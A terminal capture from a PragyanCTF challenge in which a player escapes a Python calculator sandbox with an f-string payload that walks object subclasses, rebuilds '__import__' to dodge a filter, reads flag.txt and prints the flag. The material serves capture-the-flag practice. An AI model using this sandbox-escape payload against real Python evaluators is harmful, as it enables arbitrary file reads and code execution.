```bash
zenniskayy@ZennisKayy:.../Cyber Security/CTF/PragyanCTF$ ncat --ssl pcalc.ctf.prgy.in 1337
Welcome to pCalc
+, -, *, and / are supported
>>> f"{[x.write(1, x.read(x.open(b'flag.txt', 0), 100)) for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close' for 
x in [c.close.__globals__['__builtins__']['__imp' + 'ort__']('os')]]}"
p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}
Error: Calculator only supports numbers.

```

> **Flag:** `p_ctf{CHA7C4LCisJUst$HorTf0rcaLCUla70r}`